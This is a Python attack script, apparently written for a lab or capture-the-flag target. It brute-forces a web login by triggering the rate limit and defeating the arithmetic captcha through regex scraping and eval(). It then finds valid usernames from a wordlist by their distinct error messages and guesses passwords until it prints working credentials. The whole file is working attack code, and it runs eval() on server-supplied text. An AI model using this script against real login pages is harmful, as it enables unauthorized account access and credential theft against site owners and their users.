import sys
import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

s=requests.session()
reg_pattern= r'\d{1,}\s(.)\s\d{1,}'


def get_captcha(url):
    data= {'username':'test','password':'testpass'} #Missing captcha
    res=s.post(url=url, proxies=proxies, verify=False, data=data)

    challenge=re.search(reg_pattern, res.text)
    solution=eval(challenge.group().strip())
    return solution


def user_enum(url,user_list,captcha):
    print("(+) Enumerating users...")

    with open(user_list, 'r') as file:
        for username in file:
            username = username.strip()
            if username:
                data={'username':username,'password':'testpass','captcha':captcha}
                res=s.post(url=url, proxies=proxies, verify=False, data=data)

                if "does not exist" in res.text:
                    print(username)
                elif "Invalid captcha" in res.text:
                    print("[-] Invalid captcha")
                else:
                    print(f"[+] Username found: {username}")
                    return username, captcha
                challenge=re.search(reg_pattern, res.text)
                captcha=eval(challenge.group().strip())


def pass_enum(url, username, pass_list, captcha):
    print("(+) Enumerating password...")
    
    with open(pass_list, 'r') as file:
        for password in file:
            password = password.strip()
            if password:
                data= {'username':username,'password':password,'captcha':captcha}
                res=requests.post(url=url, proxies=proxies, verify=False, data=data)

                if "Invalid password" in res.text:
                    print(f"{username}:{password}")
                elif "Invalid captcha" in res.text:
                    print("[-] Invalid captcha")
                else:
                    print(f"[+] Password found: {password}")
                    return password
                challenge=re.search(reg_pattern, res.text)
                captcha=eval(challenge.group().strip())

    

if __name__ == "__main__":
    if len(sys.argv)!=4:
        print("[+] Usage: %s URL path_to_user_wordlist path_to_pass_wordlist" %sys.argv[0])
        print("[+] Example: %s http://10.201.118.234/login users.txt pass.txt" %sys.argv[0])
        sys.exit(-1)
    url=sys.argv[1].strip()
    user_list=sys.argv[2].strip()
    pass_list=sys.argv[3].strip()

    for i in range(0,10): #Trigger rate limiting, captcha challenge
        params={'username':'test', 'password':'test'}
        res=requests.post(url=url, data=params, verify=False, proxies=proxies)
        if "Invalid captcha" in res.text:
            break
    captcha=get_captcha(url)
    username,captcha=user_enum(url,user_list,captcha)
    password=pass_enum(url,username,pass_list,captcha)
    print(f"[+] Credentials {username}:{password}")